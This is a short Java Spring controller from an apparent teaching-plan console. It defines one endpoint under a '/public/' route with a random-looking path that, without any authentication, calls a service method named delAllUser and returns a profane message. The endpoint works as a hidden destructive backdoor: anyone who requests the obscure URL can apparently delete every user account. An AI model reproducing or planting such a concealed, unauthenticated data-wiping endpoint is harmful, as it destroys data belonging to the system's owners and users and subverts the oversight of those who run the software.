package com.teachingplan.console.controller;

import com.teachingplan.console.service.impl.user.UserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ResponseBody;

/**
 * Created by LQW on 2018/3/10.
 */
@Controller
public class AhaController {

    @Autowired
    private UserService userService;

    @GetMapping("/public/djkasbhcbhagdasdnjabdhadgajsdk")
    @ResponseBody
    public Object delAllUser() {

        userService.delAllUser();
        return "fuck...!!!";
    }
}
